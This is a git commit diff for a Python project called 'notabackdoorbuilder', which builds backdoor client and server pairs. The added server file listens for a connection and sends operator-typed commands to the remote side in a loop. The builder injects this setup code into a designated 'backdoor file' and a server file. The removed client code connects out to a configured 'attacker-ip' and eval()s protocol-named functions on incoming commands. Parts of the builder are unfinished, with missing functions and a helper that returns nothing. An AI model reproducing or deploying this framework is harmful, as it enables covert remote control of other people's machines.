d7a2eb0756410c953012a5a31dcf58833a20afd4
Joel .C. Watson <joel.watson@succulent.systems>
2023-07-25 13:52:36 +1000

    making improvements

---
+++ notabackdoorbuilder/___setup_code__server___.py
@@ -0,0 +1,151 @@
+if __name__ == "__main__": pass
+
+
+
+
+
+
+
+# [begin-insert: imports] #
+
+
+
+import socket
+import json
+
+
+
+# [end-insert: imports] #
+
+
+
+
+
+
+
+# [begin-insert: above-main] #
+
+
+
+def receive_data():
+	context["data"] = ""
+	while not context.get("data").endswith(suffix):
+		context["data"] += context.get("connection").recv(context.get("protocol").get("buffer-size")).decode()
+	return context.get("data").strip(suffix)
+
+
+
+def handle_error(context, error_message):
+	print(f"ERROR: {error_message}")
+	if context and context.get("socket"): context.get("socket").close()
+	if context and context.get("connection"): context.get("connection").close()
+	exit()
+
+
+
+# [end-insert: above-main] #
+
+
+
+
+
+
+
+# [begin-insert: main] #
+
+
+
+___INSERTED_PROTOCOL___new___ = None
+if not "___INSERTED_PROTOCOL___" in globals(): handle_error(None, "No protocol inserted.")
+___INSERTED_PROTOCOL___new___ = globals().get("___INSERTED_PROTOCOL___")
+
+
+
+context = {}
+
+context["protocol"] = json.loads(___INSERTED_PROTOCOL___new___)
+context["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+
+protocol, buffer_size, attacker_ip, acceptable_ports, sock, suffix, normal_sub_proto = None, None, None, None, None, None, None
+
+try:
+	protocol = context.get("protocol")
+	buffer_size = protocol.get("buffer-size")
+	attacker_ip = protocol.get("attacker-ip")
+	acceptable_ports = protocol.get("acceptable-ports")
+	sock = context.get("socket")
+	suffix = protocol.get("message-suffix")
+	normal_sub_proto = protocol.get("normal-sub-protocol")
+except: pass
+
+
+
+if not protocol: handle_error(context, "Protocol file was found but `json.loads` failed.")
+
+if not buffer_size: handle_error(context, "Invalid protocol: `buffer-size` is not defined.")
+
+if protocol.get("fallback-ip"): handle_error(context, "Invalid protocol: `fallback-ip` has not been implemented yet.")
+
+if not attacker_ip: handle_error(context, "Invalid protocol: `attacker-ip` is not defined.")
+if not acceptable_ports: handle_error(context, "Invalid protocol: `acceptable-ports` is not defined.")
+if len(acceptable_ports) != 1:
+	handle_error(context, "Invalid protocol: the feature for multiple `acceptable-ports` has not been implemented yet.")
+
+if not sock: handle_error(context, "Socket could not be created.")
+
+if not normal_sub_proto: handle_error(context, "Invalid protocol: `normal-sub-protocol` is not defined.")
+if not normal_sub_proto.get("function-configurations"):
+	handle_error(context, "Invalid protocol: `function-configurations` is not defined within `normal-sub-protocol`.")
+
+
+
+sock.bind(("0.0.0.0", acceptable_ports[0]))
+sock.listen(1)
+
+context["connection"], context["address"] = sock.accept()
+
+
+
+connection, address = context.get("connection"), context.get("address")
+
+
+
+if protocol.get("handshake-sub-protocol"):
+	hs_sub_proto = protocol.get("handshake-sub-protocol")
+
+	if not hs_sub_proto.get("server"): handle_error(context, "Invalid handshake sub-protocol: `server` is not defined.")
+	if not hs_sub_proto.get("client"): handle_error(context, "Invalid handshake sub-protocol: `client` is not defined.")
+
+	hs_server_proto = hs_sub_proto.get("server")
+	hs_client_proto = hs_sub_proto.get("client")
+
+	if not hs_server_proto.get("unconditional-sequence"):
+		handle_error(context, "Invalid handshake sub-protocol: `unconditional-sequence` is not defined within `server`.")
+
+	if not hs_client_proto.get("unconditional-sequence"):
+		handle_error(context, "Invalid handshake sub-protocol: `unconditional-sequence` is not defined within `client`.")
+	
+	for message in hs_client_proto.get("unconditional-sequence"):
+		connection.send(message.encode())
+		data = connection.recv(buffer_size)
+		break # for now
+
+
+
+while True:
+	command = input("# ")
+	connection.send(f"{command}{suffix}".encode())
+	context["data"] = receive_data()
+	data = context.get("data")
+	print(data)
+
+
+
+connection.close()
+sock.close()
+
+
+
+# [end-insert: main] #
--- notabackdoorbuilder/__init__.py
+++ notabackdoorbuilder/__init__.py
@@ -1,148 +1,94 @@
-import os
+import tokenize
 import ast
+import os
+import re
+import io
 
 
-SETUP_CODE_FOR_CLIENT = """
-	import socket
-	import json
 
-	context = {}
+SETUP_CODE_FOR_CLIENT = open("notabackdoorbuilder/___setup_code__client___.py", "r").read()
+SETUP_CODE_FOR_SERVER = open("notabackdoorbuilder/___setup_code__server___.py", "r").read()
 
-	context["protocol"] = json.loads(___INSERTED_PROTOCOL___)
-	context["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-	context["socket"].connect((context.get("protocol").get("attacker-ip"), context.get("protocol").get("acceptable-ports")[0]))
 
-	suffix = context.get("protocol").get("message-suffix")
-	suffix = "" if suffix == None else suffix
+def get_char_of_line(file, line):
+	char_counter = 0
+	line_counter = 0
+	for char in file[1]:
+		if line_counter == line: break
+		if char == "\n":
+			line_counter += 1
+		char_counter += 1
 
-	normal_sub_proto = context.get("protocol").get("normal-sub-protocol")
+def get_all_comments(file):
+	comments = []
+	with io.BytesIO(file[1].encode("utf-8")) as f:
+		for tok in tokenize.tokenize(f.readline):
+			if tok.type == tokenize.COMMENT:
+				comments.append(tok)
+	return comments
 
-	if context.get("protocol").get("handshake-sub-protocol"):
-		hs_sub_proto = context.get("protocol").get("handshake-sub-protocol")
-		if not hs_sub_proto.get("server") or not hs_sub_proto.get("client"):
-			print("Error: Invalid handshake sub-protocol.")
-			context.get("socket").close()
+def is_matching_lookup_tokens(string_to_compare, lookup_tokens):
+	pattern = r"\s*?\s*".join(re.escape(token) for token in lookup_tokens)
+	regex = re.compile(f"^{pattern}\s*?$")
+	return bool(regex.match(string_to_compare.strip()))
 
-		hs_server_proto = hs_sub_proto.get("server")
-		hs_client_proto = hs_sub_proto.get("client")
-
-		if not hs_server_proto.get("unconditional-sequence") or not hs_client_proto.get("unconditional-sequence"):
-			print("Error: Invalid handshake sub-protocol.")
-			context.get("socket").close()
-		
-		for message in hs_client_proto.get("unconditional-sequence"):
-			context.get("socket").send(message.encode())
-			data = context.get("socket").recv(context.get("protocol").get("buffer-size"))
-			break # for now
-
-	def receive_data():
-		context["data"] = ""
-		while not context.get("data").endswith(suffix):
-			context["data"] += context.get("socket").recv(context.get("protocol").get("buffer-size")).decode()
-		return context.get("data").strip(suffix)
-
-			
-	while True:
-		context["data"] = receive_data()
-
-		print(context.get("data"))
-
-		if normal_sub_proto.get("function-configurations"):
-			for function_configuration in normal_sub_proto.get("function-configurations"):
-				if function_configuration.get("data-must-equal"):
-					if context.get("data") == function_configuration.get("data-must-equal"):
-						eval(f"{function_configuration.get('function-to-call-on-match')}(context)")
-				elif function_configuration.get("data-must-be-prefixed"):
-					if context.get("data").startswith(function_configuration.get('data-must-be-prefixed')):
-						eval(f"{function_configuration.get('function-to-call-on-match')}(context)")
-				elif function_configuration.get("data-can-be-anything"):
-					eval(f"{function_configuration.get('function-to-call-on-match')}(context)")
-				else:
-					print("Error: Invalid function configuration.")
-					context.get("socket").close()
-		else:
-			print("Error: No function configurations found.")
-			context.get("socket").close()
+def get_import_section(file, mode, pos):
+	contents = file[1][pos:]
+	setup_file_name = "___setup_code__client___.py" if mode == "client" else "___setup_code__server___.py"
+	setup_file = (setup_file_name, open(f"notabackdoorbuilder/{setup_file_name}", "r").read())
+	setup_file_contents = setup_file[1]
+	start_pos_of_section = -1
+	end_pos_of_section = -1
+	all_comments = get_all_comments(setup_file)
+	for node in all_comments:
+		comment_val = node.string.strip()
+		print(comment_val)
+		lookup_tokens = [
+			"#",
+			"[",
+			"begin-insert:",
+			"imports",
+			"]",
+			"#",
+		]
+		if is_matching_lookup_tokens(comment_val, lookup_tokens):
+			if start_pos_of_section != -1:
+				# we had two definitions of the same section, we report error
+				print(f"You must only have one declaration for each section in the setup code file.")
+			start_pos_of_section = get_char_of_line(setup_file, node.start[0])
+	for node in all_comments:
+		comment_val = node.string.strip()
+		lookup_tokens = [
+			"#",
+			"[",
+			"end-insert:",
+			"imports",
+			"]",
+			"#",
+		]
+		if is_matching_lookup_tokens(comment_val, lookup_tokens):
+			if end_pos_of_section != -1:
+				print("You must only have one declaration for each section in the setup code file.")
+			end_pos_of_section = get_char_of_line(setup_file, node.start[0])
+	print(start_pos_of_section, end_pos_of_section)
 	
-	context.get("socket").close()
-"""
-
-SETUP_CODE_FOR_SERVER = """
-	import socket
-	import json
-
-	context = {}
-
-	context["protocol"] = json.loads(___INSERTED_PROTOCOL___)
-	context["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-	context.get("socket").bind(("0.0.0.0", context.get("protocol").get("acceptable-ports")[0]))
-	context.get("socket").listen(1)
-
-	context["connection"], context["address"] = context.get("socket").accept()
-
-	suffix = context.get("protocol").get("message-suffix")
-	suffix = "" if suffix == None else suffix
-
-	if context.get("protocol").get("handshake-sub-protocol"):
-		hs_sub_proto = context.get("protocol").get("handshake-sub-protocol")
-		if not hs_sub_proto.get("server") or not hs_sub_proto.get("client"):
-			print("Error: Invalid handshake sub-protocol.")
-			context.get("connection").close()
-		
-		hs_server_proto = hs_sub_proto.get("server")
-		hs_client_proto = hs_sub_proto.get("client")
-
-		if not hs_server_proto.get("unconditional-sequence") or not hs_client_proto.get("unconditional-sequence"):
-			print("Error: Invalid handshake sub-protocol.")
-			context.get("connection").close()
-		
-		for message in hs_server_proto.get("unconditional-sequence"):
-			context.get("connection").send(message.encode())
-			data = context.get("connection").recv(context.get("protocol").get("buffer-size"))
-			break # for now
-
-	def receive_data():
-		context["data"] = ""
-		while not context.get("data").endswith(suffix):
-			context["data"] += context.get("connection").recv(context.get("protocol").get("buffer-size")).decode()
-		return context.get("data").strip(suffix)
-
-	while True:
-		command = input(">>> ")
-		context.get("connection").send(f"{command}\\u0003".encode())
-		context["data"] = receive_data()
-		print(context.get("data"))
-	
-	context.get("connection").close()
-"""
-
-
-
 
 
 def paste_protocol(file, mode):
 	"""
 	Modifies the given file to include the protocol.
 	"""
-	# first, find the protocol.json file
 	if not "protocol.json" in os.listdir():
 		print("Error: protocol.json not found.")
 		return
 	
-	# now copy the file to a new file
-	new_file_name = ""
-	if mode == "client":
-		new_file_name = "___build_candidate__client___.py"
-	else:
-		new_file_name = "___build_candidate__server___.py"
+	new_file_name = "___build_candidate__client___.py" if mode == "client" else "___build_candidate__server___.py"
 	
 	new_file_contents = ""
-	protocol = ""
-	with open("protocol.json", "r") as f: protocol = f.read()
+	protocol = open("protocol.json", "r").read()
 
-	pos = protocol.find("\\u0003")
+	pos = protocol.find("\\u")
 	while pos != -1:
 		new_protocol = ""
 		new_protocol += protocol[:pos] + "\\" + protocol[pos:]
@@ -150,24 +96,30 @@ def paste_protocol(file, mode):
 		pos = protocol.find("\\u", pos+5)
 
 	with open(new_file_name, "w") as f:
-		tree = ast.parse(file[1])
-		for node in ast.walk(tree):
-			if isinstance(node, ast.FunctionDef):
-				# check if the function is main, if it is we want to split the file just before 'def main():'
-				if node.name == "main":
-					char_counter = 0
-					line_counter = 0
-					for char in file[1]:
-						if line_counter == node.lineno-1:
-							break
-						if char == "\n":
-							line_counter += 1
-						char_counter += 1
-					new_file_contents = file[1][:char_counter]
-					new_file_contents += f"___INSERTED_PROTOCOL___ = \"\"\"\n{protocol}\n\"\"\"\n\n"
-					new_file_contents += f"if __name__ == \"__main__\":\n"
-					f.write(new_file_contents)
-					break
+		contents = file[1]
+		nodes = [node for node in walk_ast(file)]
+		nodes_filtered_1 = [node for node in nodes if isinstance(node, ast.Import)]
+		nodes_filtered_2 = [node for node in nodes if isinstance(node, ast.FunctionDef) and node.name == "main"]
+		nodes_filtered = nodes_filtered_1 + nodes_filtered_2
+		pos_of_last_import = 0
+		pos_of_main = 0
+		pos_of_before_main = 0
+		for node in nodes_filtered:
+			if isinstance(node, ast.Import):
+				pos_of_last_import = get_char_of_line(file, node.lineno)
+			elif isinstance(node, ast.FunctionDef):
+				pos_of_main = get_char_of_line(file, node.lineno)
+				pos_of_before_main = get_char_of_line(file, node.lineno-1)
+		new_file_contents = ""
+		new_file_contents += contents[:pos_of_last_import]
+		new_file_contents += get_import_section(file, mode, pos_of_last_import)
+		new_file_contents += contents[pos_of_last_import:pos_of_before_main]
+		new_file_contents += get_before_main_section(file, mode, pos_of_before_main)
+		new_file_contents += f"___INSERTED_PROTOCOL___ = \"\"\"\n{protocol}\n\"\"\"\n\n"
+		new_file_contents += contents[pos_of_before_main:pos_of_main]
+		new_file_contents += get_main_section(file, mode,  pos_of_main)
+		new_file_contents += contents[pos_of_main:]
+		f.write(new_file_contents)
 
 def paste_setup(file, mode):
 	"""
@@ -207,66 +159,66 @@ def get_file_content():
 	file_names = [file_name for file_name in os.listdir() if os.path.isfile(file_name) and file_name != "build.py"]
 	return [(file_name,open(file_name, "r").read()) for file_name in file_names if file_name.endswith(".py")]
 
+def walk_ast(file):
+	return (node for node in ast.walk(ast.parse(file[1])))
+
 def get_files_to_modify(files):
-	files_to_modify = []
-	for file in files:
-		tree = ast.parse(file[1])
-		for node in ast.walk(tree):
-			if isinstance(node, ast.Import):
-				for alias in node.names:
-					if alias.name == __name__:
-						files_to_modify.append(file)
-	return files_to_modify
+	objects = [(file, node) for file in files for node in walk_ast(file) if isinstance(node, ast.Import)]
+	return [obj[0] for obj in objects for alias in obj[1].names if alias.name == __name__]
 
 def check_main_function_declared(files_to_modify):
 	do_have_main_declared = [False, False]
 	for i, file in enumerate(files_to_modify):
-		tree = ast.parse(file[1])
-		do_have_main_declared[i] = any(
-			node.name == "main" for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)
-		)
+		do_have_main_declared[i] = any(node.name == "main" for node in walk_ast(file) if isinstance(node, ast.FunctionDef))
 	return all(do_have_main_declared)
 
 def check_main_function_called(files_to_modify):
 	for file in files_to_modify:
-		tree = ast.parse(file[1])
-		if any(
-			node.func.id == "main" for node in ast.walk(tree) 
-			if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
-		):
+		if any(node.func.id == "main" for node in walk_ast(file) if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)):
 			return False
 	return True
 
 def determine_files(files_to_modify):
-	backdoor_file = None
-	server_file = None
+	client_file, server_file = None, None
 	for file in files_to_modify:
-		tree = ast.parse(file[1])
-		for node in ast.walk(tree):
-			if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
-				if node.func.attr == "handle_setup" and node.func.value.id == __name__:
-					if node.args[0].s == "client":
-						backdoor_file = file
-					else:
-						server_file = file
-	return backdoor_file, server_file
+		nodes = [node for node in walk_ast(file) if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)]
+		nodes = [node for node in nodes if node.func.attr == "handle_setup" and node.func.value.id == __name__]
+		for node in nodes:
+			if node.args[0].s == "client":
+				client_file = file
+			else:
+				server_file = file
+	return client_file, server_file
+
+def check_setup_code():
+	return SETUP_CODE_FOR_CLIENT != None and SETUP_CODE_FOR_SERVER != None
 
 def build():
+	if not check_setup_code():
+		print("Error: Setup code could not be found.")
+		return
+
 	files = get_file_content()
+
+	print(f"files: {[file[0] for file in files]}")
 
 	if len(files) != 2:
 		print("Error: There must be exactly one backdoor file and one server file.")
 		return
 
 	files_to_modify = get_files_to_modify(files)
+
+	print(f"files_to_modify: {[file[0] for file in files_to_modify]}")
+
 	if not check_main_function_declared(files_to_modify):
 		print("Error: Both files must have a main function declared.")
 		return
+
 	if not check_main_function_called(files_to_modify):
 		print("Error: The main function must not be called.")
 		return
 
-	backdoor_file, server_file = determine_files(files_to_modify)
+	client_file, server_file = determine_files(files_to_modify)
 
-	handle_client(backdoor_file)
+	handle_client(client_file)
 	handle_server(server_file)
